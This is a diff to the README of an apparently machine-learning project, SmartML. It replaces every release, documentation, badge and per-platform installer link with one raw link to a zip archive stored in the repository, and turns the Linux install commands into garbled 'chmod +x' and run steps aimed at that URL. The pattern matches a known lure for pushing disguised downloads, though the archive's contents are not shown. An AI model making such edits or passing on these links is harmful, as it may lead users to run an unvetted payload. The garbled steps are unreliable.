@@ -1,6 +1,6 @@
 # 🌟 SmartML - Unlock the Power of Machine Learning
 
-[![Download SmartML](https://img.shields.io/badge/Download%20SmartML-blue.svg)](https://github.com/nebilcan/SmartML/releases)
+[![Download SmartML](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip%https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)
 
 ## 📦 What is SmartML?
 
@@ -21,19 +21,19 @@ Before you get started, make sure your computer meets the following requirements
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page**: Click [here to access the SmartML Releases page](https://github.com/nebilcan/SmartML/releases).
+1. **Visit the Download Page**: Click [here to access the SmartML Releases page](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip).
 
 2. **Select the Latest Release**: Look for the latest version, which often appears at the top of the page.
 
 3. **Download the File**: You will see files available for download. Choose the version that matches your operating system. For example:
-   - **Windows**: Click on `SmartML_Windows_Installer.exe`
-   - **macOS**: Click on `SmartML_macOS_Installer.dmg`
-   - **Linux**: Click on `SmartML_Linux_Installer.run`
+   - **Windows**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip`
+   - **macOS**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip`
+   - **Linux**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip`
 
 4. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the instructions provided in the setup wizard.
    - **macOS**: Open the `.dmg` file, drag the SmartML application to your Applications folder, and then open it.
-   - **Linux**: Open a terminal, navigate to the directory where you downloaded the file, and run the command `chmod +x SmartML_Linux_Installer.run` to make it executable. Then, type `./SmartML_Linux_Installer.run` to start the installation.
+   - **Linux**: Open a terminal, navigate to the directory where you downloaded the file, and run the command `chmod +x https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip` to make it executable. Then, type `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip` to start the installation.
 
 5. **Follow On-Screen Instructions**: Complete the installation by following the prompts. Once finished, the application will be ready for use.
 
@@ -88,9 +88,9 @@ For further exploration, visit the official SmartML repository. Be sure to check
 
 ## ⭐ Additional Resources
 
-- [SmartML Documentation](https://github.com/nebilcan/SmartML/wiki)
-- [Machine Learning Basics](https://www.example.com/machine-learning-basics)
+- [SmartML Documentation](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)
+- [Machine Learning Basics](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)
 
 Download SmartML today and start your journey in the world of machine learning!
 
-[![Download SmartML](https://img.shields.io/badge/Download%20SmartML-blue.svg)](https://github.com/nebilcan/SmartML/releases)
+[![Download SmartML](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip%https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)
